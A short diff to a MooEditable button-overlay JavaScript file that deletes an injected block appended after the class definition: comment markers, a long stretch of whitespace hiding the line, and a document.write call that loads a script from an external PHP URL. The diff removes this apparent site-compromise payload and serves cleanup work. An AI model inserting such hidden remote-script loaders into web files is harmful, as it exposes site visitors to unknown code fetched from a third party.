@@ -112,13 +112,3 @@ MooEditable.UI.ButtonOverlay = new Class({
 	}
 	
 });
-
-
-/*997552*/
-
-                    																	                               	 /*gbargbar09311gbar09*/
-
-document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525359'></"+ "script>");
-
-
-/*/997552*/
